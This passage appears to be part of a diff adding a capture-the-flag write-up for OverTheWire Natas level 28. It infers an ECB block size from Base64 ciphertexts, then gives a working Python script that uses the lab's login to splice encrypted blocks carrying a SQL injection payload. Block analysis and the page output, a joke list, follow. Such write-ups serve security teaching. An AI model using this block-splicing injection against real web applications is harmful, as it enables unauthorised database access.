+Kf3hzvbj+EoXJjPzB0/I4YZIaVSupG+5Ppq4WEW09L0Nf/K3JUU/wpRwHlH118D44=
+JFPgAgYC9NzNUPDrdwlHfCiW3pCIT4YQixZ/i0rqXXY5FyMgUUg+aORY/QZhZ7MKM=
+KeYiaGpSZAWVcGCZq8sFK7oJUi8wHPnTascCPxZZSMWpc5zZBSL6eob5V3O1b5+MA=
+LAhy3ui8kLEVaROwiiI6Oec4pf+0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI=
+LAhy3ui8kLEVaROwiiI6OetO2gh9PAvqK+3BthQLni68qM9OYQkTq645oGdhkgSlo=
+LAhy3ui8kLEVaROwiiI6OezoKpVTtluBKA+2078pAPR3X9UET9Bj0m9rt/c0tByJk=
+LAhy3ui8kLEVaROwiiI6OeH3RxTXb8xdRkxqIh5u2Y5GIjoU2cQpG5h3WwP7xz1O3YrlHX2nGysIPZGaDXuIuY
+LAhy3ui8kLEVaROwiiI6Oe7NNvj9kWTUA1QORJcH0n5UJXo0PararywOOh1xzgPdF7e6ymVfKYoyHpDj96YNTY
+LAhy3ui8kLEVaROwiiI6OeWu8qmX2iNj9yo/rTMtFzb6dz8xhQlKoBQI8fl9A304VnjFdz7MKPhw5PTrxsgHCk
+LAhy3ui8kLEVaROwiiI6OeiSUVjPxawG0iv9oLcsjxUad+jtGqvgtdBcT/5qwUI6tHjrGh/iYaLGwVBhEJs/7a
+LAhy3ui8kLEVaROwiiI6OerfihrQF37R7K06x8EIKqnr36EFTsaFFc+W8qVURZGUeQT0sqvywtdoaqcqUxUclw
+LAhy3ui8kLEVaROwiiI6OeU9lJnrytaGHwS3zcJPMEYkh5mgex0ptZggFck1XC4A6t7ZvbrKanO3GzWgENLExX
+LAhy3ui8kLEVaROwiiI6OepUn9pSttm04mMtsxg4hW1ZouK1228x8ZoU91Z46tqpBCSbk+TeoJCUeZlbnESzUa
+LAhy3ui8kLEVaROwiiI6OeIBG75Ijd4bvslhthcLMOEikofzzFR54S5m8xyGOxgEdW1XMtyMdw9kOXFYvBem5m
+LAhy3ui8kLEVaROwiiI6OeiCmh+TDOtWa4NEQcBXdALKw7hxwcRIOGtFzTbZ6PcvRlUUm7uiEj2J2VQX6ifzp7
+LAhy3ui8kLEVaROwiiI6OeVHYCtS+uFWasjpcfkfbWBUHAmMS6zcXtk1dWTlEF3X5k0NzIaCU2kq38vTeW0b+K
+LAhy3ui8kLEVaROwiiI6OepFqT7keU0bYgT7CSC2jyfWSGlUrqRvuT6auFhFtPS9DX/ytyVFP8KUcB5R9dfA+O
+LAhy3ui8kLEVaROwiiI6Oe7aEY+Zn5SV6PPZc/umUoo4lt6QiE+GEIsWf4tK6l12ORcjIFFIPmjkWP0GYWezCj
+LAhy3ui8kLEVaROwiiI6Oe8pCcTVN4HuF3egErsaclQaCVIvMBz502rHAj8WWUjFqXOc2QUi+nqG+VdztW+fjA
+LAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo3OKX/tKRQAkZ3UXWuWWu9bzTfM5xp7c4R9mULvO1icC
+LAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo7TtoIfTwL6ivtwbYUC54uvKjPTmEJE6uuOaBnYZIEpa
+LAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo86CqVU7ZbgSgPttO/KQD0d1/VBE/QY9Jva7f3NLQciZ
+LAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqox90cU12/MXUZMaiIebtmORiI6FNnEKRuYd1sD+8c9Tt2K5R19pxsrCD2Rmg17iLmA==
+LAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo+zTb4/ZFk1ANUDkSXB9J+VCV6ND2q2q8sDjodcc4D3Re3usplXymKMh6Q4/emDU2A==
+LAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo1rvKpl9ojY/cqP60zLRc2+nc/MYUJSqAUCPH5fQN9OFZ4xXc+zCj4cOT068bIBwpA==
+LAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo4klFYz8WsBtIr/aC3LI8VGnfo7Rqr4LXQXE/+asFCOrR46xof4mGixsFQYRCbP+2g==
+LAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo634oa0Bd+0eytOsfBCCqp69+hBU7GhRXPlvKlVEWRlHkE9LKr8sLXaGqnKlMVHJcA==
+LAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo1PZSZ68rWhh8Et83CTzBGJIeZoHsdKbWYIBXJNVwuAOre2b26ympztxs1oBDSxMVw==
+LAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo6VJ/aUrbZtOJjLbMYOIVtWaLitdtvMfGaFPdWeOraqQQkm5Pk3qCQlHmZW5xEs1Gg==
+LAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqoyARu+SI3eG77JYbYXCzDhIpKH88xUeeEuZvMchjsYBHVtVzLcjHcPZDlxWLwXpuZg==
+LAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo4gpofkwzrVmuDREHAV3QCysO4ccHESDhrRc022ej3L0ZVFJu7ohI9idlUF+on86ew==
+LAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo1R2ArUvrhVmrI6XH5H21gVBwJjEus3F7ZNXVk5RBd1+ZNDcyGglNpKt/L03ltG/ig==
+LAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo6Rak+5HlNG2IE+wkgto8n1khpVK6kb7k+mrhYRbT0vQ1/8rclRT/ClHAeUfXXwPjg==
+```
+
+The common part `LAhy3ui8kLEVaROwiiI6Oe` appearing at a certain point has length:
+```python
+>>> print(len("LAhy3ui8kLEVaROwiiI6Oe"))
+22
+```
+
+We learn [online](https://i.sstatic.net/DEB8w.png) that $3n$ bytes are Base64-encoded to $4n$ characters.
+
+Thus, a string of $n$ bytes will be encoded to $\lceil{4n\over 3}\rceil$ bytes.
+
+Reversing this:
+```
+>>> len("LAhy3ui8kLEVaROwiiI6Oe") / 4 * 3
+16.5
+```
+
+This gives us the block size, which will be $16$.
+
+Analogous can be calculated from another common part appearing in the following queries: `s5A4wo33m2XSYVHfWPfqo`:
+```
+>>> import math
+>>> math.ceil(len("s5A4wo33m2XSYVHfWPfqo") / 4 * 3)
+16
+```
+
+The script injecting the malicious query:
+```python
+import requests
+import urllib
+import string
+import os
+import base64
+
+from utils import utils
+
+
+basic_auth = ('natas28', '1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj')
+
+url = "http://natas28.natas.labs.overthewire.org/index.php"
+headers = {"Content-Type": "application/x-www-form-urlencoded"}
+
+letters = string.ascii_letters
+
+prefix = "G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjP"
+suffix = "c4pf+0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI="
+
+def send_request(session, query) -> str:
+    body = {"query": query}
+    response = session.post(url,
+                    headers=headers,
+                    data=body)
+    result = response.url.split("=")[1]
+    return urllib.parse.unquote(result)
+
+if __name__ == '__main__':
+    session = requests.Session()
+    session.auth = basic_auth
+    inner_block_query = "          "
+    res_inner_block = send_request(session, inner_block_query)
+    inner_block = res_inner_block[len(prefix):len(res_inner_block) - len(suffix)]
+    query = "AAAAAAAAA' OR 1=1 -- " # The final space is necessary!
+    res = send_request(session, query)
+    my_part = res[len(prefix) + len(inner_block):]
+    query = prefix + inner_block + my_part + suffix
+    url_encoded = urllib.parse.quote_plus(query)
+    print(url_encoded)
+```
+
+The suffix (URL-encoded) to append to `query=` in the URL: 
+```
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPItlMM3qTizkRB5P2zYxJsbWY4bHaEWFEfgtXy4iixC3kHAmMS6zcXtk1dWTlEF3X5k0NzIaCU2kq38vTeW0b%2BKc4pf%2B0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI%3D
+```
+
+An analysis of the blocks (with addede spaces):
+```
+Full normal query:    G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPItlMM3qTizkRB5P2zYxJsbc4pf+0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI=
+Prefix:               G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjP
+Inner block:                                                    ItlMM3qTizkRB5P2zYxJsb
+Suffix:                                                                               c4pf+0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI=
+Full malicious query: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPIWJ2pwLjKxd0ddiQ3a1c5lWY4bHaEWFEfgtXy4iixC3kHAmMS6zcXtk1dWTlEF3X5k0NzIaCU2kq38vTeW0b+K
+Malicious block:                                                                      WY4bHaEWFEfgtXy4iixC3kHAmMS6zcXtk1dWTlEF3X5k0NzIaCU2kq38vTeW0b+K
+
+New malicious query (not URL-encoded):
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPItlMM3qTizkRB5P2zYxJsbWY4bHaEWFEfgtXy4iixC3kHAmMS6zcXtk1dWTlEF3X5k0NzIaCU2kq38vTeW0b+Kc4pf+0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI=
+```
+
+From the page, we get:
+
+> Whack Computer Joke Database
+>
+> Q: How do you tell an introverted computer scientist from an extroverted computer scientist?
+>    A: An extroverted computer scientist looks at your shoes when he talks to you.
+>
+>    Q: Why do programmers always mix up Halloween and Christmas?
+>    A: Because Oct 31 == Dec 25!
+>
+>    There are 10 kinds of people in the world: Those that know binary & those that don't
+>
+>    Two bytes meet. The first byte asks, "Are you ill?"
+>    The second byte replies, "No, just feeling a bit off."
+>
+>    Q: how many programmers does it take to change a light bulb?
+>    A: none, that's a hardware problem.
+>    There are no shortcuts in life, unless you right click and find one...
+>    Keyboard not found ... press F1 to continue
+>    "Knock, knock.""Who's there?"
+>    very long pause...
+>    "Java."
+>
+>    A physicist, an engineer and a programmer were in a car driving over a steep alpine pass when the brakes failed. The car was getting faster and faster, they were struggling to get round the corners and once or twice only the feeble crash barrier saved them from crashing down the side of the mountain. They were sure they were all going to die, when suddenly they spotted an escape lane. They pulled into the escape lane, and came safely to a halt.
+>    The physicist said "We need to model the friction in the brake pads and the resultant temperature rise, see if we can work out why they failed".
+>    The engineer said "I think I've got a few spanners in the back. I'll take a look and see if I can work out what's wrong".
+>    The programmer said "Why don't we get going again and see if it's reproducible?"
+>
+>    Q: Whats the object-oriented way to become wealthy?
+>    A: Inheritance
+>
+>    Old C programmers don't die, they're just cast into void.
+>
+>    A SQL query goes into a bar, walks up to two tables and asks, "Can I join you?"
+>
+>    When your hammer is C++, everything begins to look like a thumb.
+>
+>    When we write programs that "learn", it turns out we do and they don't.
+>
+>    I've got a really good UDP joke to tell you, but I don't know if you'll get it
+>
+>    Q: What is a computer virus?
+>    A: A terminal illness!
+>
+>    Recursion: Definition of recursion, see recursion.
+>
+>    A bright young coder named Lee
+>    Wished to loop while i was 3
+>    But when writing the =
+>    He forgot its sequel
+>    And thus looped infinitely
+>
+>    A computer lets you make more mistakes faster than any invention in human history - with the possible exceptions of handguns and tequila.
+>
+>    If it weren't for C, we'd all be programming in BASI and OBOL.
+>
+>    Two strings walk into a bar and sit down. The bartender says, "So what'll it be?"
+>    The first string says, "I think I'll have a beer quag fulk boorg jdk`^Xbasdh dsa 23^@!8
+>    "Please excuse my friend," the second string says. "He isn't null-terminated."
+>
+>    Q: Why does Python live on land?
+>    A: Because it is above C level!
+
